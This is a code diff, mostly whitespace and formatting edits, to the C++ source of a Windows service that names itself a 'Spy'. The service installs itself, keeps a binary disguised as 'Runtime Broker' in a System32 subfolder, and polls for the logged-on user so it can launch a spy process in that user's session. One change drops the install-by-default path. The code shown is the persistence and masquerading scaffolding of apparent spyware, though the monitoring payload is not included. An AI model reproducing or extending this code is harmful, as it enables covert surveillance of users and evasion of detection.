@@ -18,12 +18,12 @@ HANDLE                  ghSvcStopEvent = NULL;
 int						threadFlag;
 //############################################################### Functions
 VOID InstallMySpy();
-VOID WINAPI SSpyService(DWORD dwArgc, LPTSTR *lpszArgv);
-VOID ServiceInit(DWORD dwArgc, LPTSTR *lpszArgv);
+VOID WINAPI SSpyService(DWORD dwArgc, LPTSTR* lpszArgv);
+VOID ServiceInit(DWORD dwArgc, LPTSTR* lpszArgv);
 VOID ReportMyStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
 VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl);
 VOID WINAPI RemoveMySpy();
-void __cdecl ServiceWork(void * Args);
+void __cdecl ServiceWork(void* Args);
 bool TrainNewSpy(DWORD id, STARTUPINFO* si, PROCESS_INFORMATION* pi);
 void RemoveTheSpy(STARTUPINFO* si, PROCESS_INFORMATION* pi);
 DWORD getUserID();
@@ -42,7 +42,7 @@ std::wstring directoryPath = L"C:\\Windows\\System32\\PointOfService\\ProtocolPr
 // Return value:
 //   Status of application as integer
 //
-int main(int argc, char *argv[])
+int main(int argc, char* argv[])
 {
 	if (SHCreateDirectoryEx(NULL, directoryPath.c_str(), NULL)) {
 		std::wcout << L"Already exist or something wrong " << directoryPath << std::endl;
@@ -52,7 +52,7 @@ int main(int argc, char *argv[])
 	}
 
 	if (argc > 1)
-	{ 
+	{
 		if (strcmp(argv[1], "install") == 0)
 		{
 			InstallMySpy();
@@ -73,10 +73,6 @@ int main(int argc, char *argv[])
 			printf("No help for now, sorry :(");
 			return 0;
 		}
-	}
-	else {
-		InstallMySpy();
-		return 0;
 	}
 	SERVICE_TABLE_ENTRY DispatchTable[] =
 	{
@@ -119,7 +115,7 @@ VOID InstallMySpy()
 	}
 
 	// Get a handle to the SCM database. 
-	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 
 	if (schSCManager == NULL)
 	{
@@ -151,8 +147,8 @@ VOID InstallMySpy()
 	}
 	else printf("Service installed successfully\n");
 
-	
-	SERVICE_DESCRIPTION desc{ (LPTSTR) DESC };
+
+	SERVICE_DESCRIPTION desc{ (LPTSTR)DESC };
 	ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &desc);
 	CloseServiceHandle(schService);
 	CloseServiceHandle(schSCManager);
@@ -194,7 +190,7 @@ VOID WINAPI RemoveMySpy()
 	}
 
 	if (!DeleteFile((directoryPath + L"Runtime Broker").c_str()))
-		printf("Warning! Spy cannot be deleted(%d)\n",GetLastError());
+		printf("Warning! Spy cannot be deleted(%d)\n", GetLastError());
 
 	// Delete the service.
 	if (!DeleteService(schService))
@@ -223,10 +219,10 @@ VOID WINAPI RemoveMySpy()
 // Return value:
 //   None.
 //
-VOID WINAPI SSpyService(DWORD dwArgc, LPTSTR *lpszArgv)
+VOID WINAPI SSpyService(DWORD dwArgc, LPTSTR* lpszArgv)
 {
 	// Register the handler function for the service
-	gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME,ServiceCtrlHandler);
+	gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME, ServiceCtrlHandler);
 
 	if (!gSvcStatusHandle)
 	{
@@ -259,7 +255,7 @@ VOID WINAPI SSpyService(DWORD dwArgc, LPTSTR *lpszArgv)
 // Return value:
 //   None
 //
-VOID ServiceInit(DWORD dwArgc, LPTSTR *lpszArgv)
+VOID ServiceInit(DWORD dwArgc, LPTSTR* lpszArgv)
 {
 	// Create an event. The control handler function, ServiceCtrlHandler,
 	// signals this event when it receives the stop control code.
@@ -376,18 +372,18 @@ VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl)
 // Return value:
 //   None
 //
-void __cdecl ServiceWork(void * Args)
+void __cdecl ServiceWork(void* Args)
 {
 	//Handle for a user Token
-	
+
 	DWORD id = 0;
 	DWORD lastid = 0;
 	DWORD processcheck;
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
 	bool ok = false;
-	
-	while(threadFlag)
+
+	while (threadFlag)
 	{
 		lastid = getUserID();
 		if (ok)
@@ -408,7 +404,7 @@ void __cdecl ServiceWork(void * Args)
 				ok = TrainNewSpy(id, &si, &pi);
 			}
 		}
-		
+
 		Sleep(4000);
 	}
 	RemoveTheSpy(&si, &pi);
